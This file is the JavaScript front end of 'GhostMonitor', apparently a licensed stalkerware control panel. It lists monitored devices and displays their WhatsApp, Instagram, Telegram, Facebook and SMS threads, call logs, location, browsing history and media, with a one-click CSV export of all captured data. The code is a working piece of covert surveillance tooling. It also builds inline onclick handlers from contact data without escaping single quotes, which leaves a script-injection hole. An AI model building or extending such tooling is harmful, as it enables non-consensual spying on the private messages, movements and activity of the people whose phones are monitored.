let autoRefreshTimer = null;

document.addEventListener('DOMContentLoaded', function () {
    initNavigation();
    initMobileMenu();
    loadLicenseStatus();
    loadOverviewData();
    // Auto-refresh active section every 15 seconds
    autoRefreshTimer = setInterval(() => {
        const active = document.querySelector('.section.active')?.id;
        if (active) loadSectionData(active);
    }, 15000);
});

function initNavigation() {
    document.querySelectorAll('nav a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const section = link.dataset.section;
            switchSection(section);
            closeMobileMenu();
        });
    });
}

function initMobileMenu() {
    const menuToggle = document.getElementById('menuToggle');
    menuToggle.addEventListener('click', (e) => {
        e.stopPropagation();
        toggleMobileMenu();
    });
}

function toggleMobileMenu() {
    const sidebar  = document.getElementById('sidebar');
    const overlay  = document.querySelector('.sidebar-overlay');
    sidebar.classList.toggle('active');
    document.body.classList.toggle('menu-open');
    overlay.classList.toggle('active');
}

function closeMobileMenu() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.querySelector('.sidebar-overlay');
    sidebar.classList.remove('active');
    document.body.classList.remove('menu-open');
    if (overlay) overlay.classList.remove('active');
}

function switchSection(section) {
    closeMobileMenu();
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
    document.getElementById(section)?.classList.add('active');
    document.querySelector(`[data-section="${section}"]`)?.classList.add('active');
    loadSectionData(section);
}

// Central dispatcher — called on section switch and auto-refresh
function loadSectionData(section) {
    switch (section) {
        case 'overview':   loadOverviewData(); break;
        case 'whatsapp':   loadContacts('whatsapp');   break;
        case 'instagram':  loadContacts('instagram');  break;
        case 'telegram':   loadContacts('telegram');   break;
        case 'facebook':   loadContacts('facebook');   break;
        case 'sms':        loadContacts('sms');        break;
        case 'calls':      loadCalls();                break;
        case 'location':   initMap();                  break;
        case 'browsing':   loadBrowsing();             break;
        case 'media':      loadMedia();                break;
    }
}

async function loadLicenseStatus() {
    try {
        const res  = await fetch('api/license.php');
        const data = await res.json();
        const el   = document.getElementById('licenseStatus');
        el.textContent = data.status;
        el.style.color = data.status === 'Active' ? '#10b981' : '#ef4444';
        document.getElementById('days-remaining').textContent = data.days_remaining ?? 0;
        if ((data.days_remaining ?? 0) <= 0) el.textContent = 'EXPIRED';
    } catch (e) { console.error('License check failed:', e); }
}

async function loadOverviewData() {
    try {
        const res  = await fetch('api/data.php?type=overview');
        const data = await res.json();
        document.getElementById('total-messages').textContent   = data.total_messages   ?? 0;
        document.getElementById('total-calls').textContent      = data.total_calls      ?? 0;
        document.getElementById('location-updates').textContent = data.location_updates ?? 0;
        document.getElementById('total-time').textContent       = data.total_time       ?? '—';

        // Device status
        const devices = data.devices ?? [];
        const statusEl = document.getElementById('device-status-list');
        if (statusEl) {
            if (!devices.length) {
                statusEl.innerHTML = '<div style="color:var(--muted);font-size:0.8rem">No devices registered yet</div>';
            } else {
                statusEl.innerHTML = devices.map(d => `
                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
                        <div style="width:10px;height:10px;border-radius:50%;background:${d.status==='online'?'#10D98A':'#5A5670'};
                            box-shadow:${d.status==='online'?'0 0 8px #10D98A':''};flex-shrink:0"></div>
                        <span style="font-size:0.82rem;color:var(--text2)">${d.device_id.substring(0,16)}...</span>
                        <span style="font-size:0.75rem;color:var(--muted);margin-left:auto">${d.status.toUpperCase()}</span>
                    </div>`).join('');
            }
        }

        if (typeof initCharts === 'function') initCharts(data);
    } catch (e) { console.error('Overview load failed:', e); }
}

// ── Contacts (WhatsApp / Instagram / Telegram / Facebook / SMS) ───────────────
async function loadContacts(app) {
    const container = document.getElementById(`${app}-contacts`);
    if (!container) return;
    const search = document.getElementById(`${app}-search`)?.value ?? '';
    container.innerHTML = '<div class="loading-card">Loading...</div>';
    try {
        const res  = await fetch(`api/data.php?type=${app}&search=${encodeURIComponent(search)}`);
        const data = await res.json();
        const contacts = data.contacts ?? [];
        if (!contacts.length) {
            container.innerHTML = '<div class="loading-card">No data yet.</div>';
            return;
        }
        container.innerHTML = contacts.map(c => `
            <div class="contact-item" onclick="loadThread('${app}','${escHtml(c.contact_id)}','${escHtml(c.contact_name)}',this)">
                <div class="contact-header">
                    <strong>${escHtml(c.contact_name || c.contact_id)}</strong>
                    <span>${c.message_count} msgs · ${c.last_message_time ?? ''}</span>
                </div>
                <div style="font-size:0.82rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">
                    ${escHtml((c.last_message ?? '').substring(0, 80))}
                </div>
                <div class="contact-messages" id="thread-${escHtml(c.contact_id)}" style="display:none"></div>
            </div>`).join('');
    } catch (e) {
        container.innerHTML = '<div class="loading-card">Failed to load.</div>';
        console.error(e);
    }
}

async function loadThread(app, contactId, contactName, el) {
    const threadEl = el.querySelector('.contact-messages');
    if (!threadEl) return;
    const isOpen = threadEl.style.display !== 'none' && threadEl.innerHTML !== '';
    if (isOpen) { threadEl.style.display = 'none'; return; }
    threadEl.style.display = 'grid';
    threadEl.innerHTML = '<div class="loading-card" style="padding:0.5rem">Loading messages...</div>';
    try {
        const res  = await fetch(`api/data.php?type=${app}&action=thread&contact_id=${encodeURIComponent(contactId)}`);
        const data = await res.json();
        const msgs = data.messages ?? [];
        if (!msgs.length) { threadEl.innerHTML = '<div style="color:var(--muted);font-size:0.8rem;padding:0.5rem">No messages.</div>'; return; }
        threadEl.innerHTML = msgs.map(m => `
            <div class="message ${m.direction === 'SENT' ? 'sent' : 'received'}">
                <div>${escHtml(m.content ?? '')}</div>
                <div style="font-size:0.7rem;opacity:0.6;margin-top:2px">${m.datetime ?? ''}</div>
            </div>`).join('');
        threadEl.scrollTop = threadEl.scrollHeight;
    } catch (e) { threadEl.innerHTML = '<div style="color:var(--muted);font-size:0.8rem;padding:0.5rem">Failed.</div>'; }
}

// ── Calls ─────────────────────────────────────────────────────────────────────
async function loadCalls() {
    const container = document.getElementById('calls-list');
    if (!container) return;
    const start = document.getElementById('calls-start')?.value;
    const end   = document.getElementById('calls-end')?.value;
    const params = new URLSearchParams({ type: 'calls' });
    if (start) params.set('start', start);
    if (end)   params.set('end', end);
    container.innerHTML = '<div class="loading-card">Loading calls...</div>';
    try {
        const res  = await fetch(`api/data.php?${params}`);
        const data = await res.json();
        const calls = data.calls ?? [];
        if (!calls.length) { container.innerHTML = '<div class="loading-card">No calls found.</div>'; return; }
        container.innerHTML = calls.map(c => `
            <div class="contact-item">
                <div class="contact-header">
                    <strong>${escHtml(c.contact_name || c.contact_id)}</strong>
                    <span>${c.direction} · ${c.datetime ?? ''}</span>
                </div>
                <div style="font-size:0.82rem;color:var(--muted)">${escHtml(c.content ?? '')}</div>
            </div>`).join('');
    } catch (e) { container.innerHTML = '<div class="loading-card">Failed to load.</div>'; }
}

// ── Browsing ──────────────────────────────────────────────────────────────────
async function loadBrowsing() {
    const container = document.getElementById('browsing-history');
    if (!container) return;
    const filter = document.getElementById('browsing-filter')?.value ?? 'today';
    container.innerHTML = '<div class="loading-card">Loading...</div>';
    try {
        const res  = await fetch(`api/data.php?type=browsing&filter=${filter}`);
        const data = await res.json();
        const history = data.history ?? [];
        if (!history.length) { container.innerHTML = '<div class="loading-card">No browsing data.</div>'; return; }
        container.innerHTML = history.map(h => `
            <div class="contact-item">
                <div class="contact-header">
                    <strong>${escHtml(h.title ?? h.url ?? '')}</strong>
                    <span>${h.datetime ?? ''}</span>
                </div>
                <div style="font-size:0.8rem;color:var(--muted);word-break:break-all">${escHtml(h.url ?? '')}</div>
            </div>`).join('');
    } catch (e) { container.innerHTML = '<div class="loading-card">Failed to load.</div>'; }
}

// ── Media ─────────────────────────────────────────────────────────────────────
async function loadMedia() {
    const container = document.getElementById('media-grid');
    if (!container) return;
    container.innerHTML = '<div class="loading-card">Loading media...</div>';
    try {
        const res  = await fetch('api/data.php?type=media');
        const data = await res.json();
        const media = data.media ?? [];
        if (!media.length) { container.innerHTML = '<div class="loading-card">No media found.</div>'; return; }
        container.innerHTML = media.map(m => {
            const meta = m.media_meta ? JSON.parse(m.media_meta) : {};
            return `<div class="contact-item" style="text-align:center">
                <div style="font-size:2rem">📎</div>
                <div style="font-size:0.8rem;margin-top:0.4rem">${escHtml(m.app_type)}</div>
                <div style="font-size:0.75rem;color:var(--muted)">${m.datetime ?? ''}</div>
                ${meta.size ? `<div style="font-size:0.7rem;color:var(--muted)">${(meta.size/1024).toFixed(1)} KB</div>` : ''}
            </div>`;
        }).join('');
    } catch (e) { container.innerHTML = '<div class="loading-card">Failed to load.</div>'; }
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function escHtml(str) {
    return String(str ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function logout() {
    if (confirm('Logout from GhostMonitor?')) {
        fetch('api/auth.php?action=logout').then(() => { window.location.href = 'login.php'; });
    }
}

async function downloadAllData() {
    try {
        const res  = await fetch('api/data.php?action=export');
        const blob = await res.blob();
        const url  = window.URL.createObjectURL(blob);
        const a    = document.createElement('a');
        a.href = url;
        a.download = `ghostmonitor_${new Date().toISOString().slice(0,10)}.csv`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    } catch (e) { alert('Download failed'); }
}

// Search handlers — attach to search inputs
document.addEventListener('DOMContentLoaded', () => {
    ['whatsapp','instagram','telegram','facebook','sms'].forEach(app => {
        const input = document.getElementById(`${app}-search`);
        if (input) {
            let t;
            input.addEventListener('input', () => {
                clearTimeout(t);
                t = setTimeout(() => loadContacts(app), 400);
            });
        }
    });
});
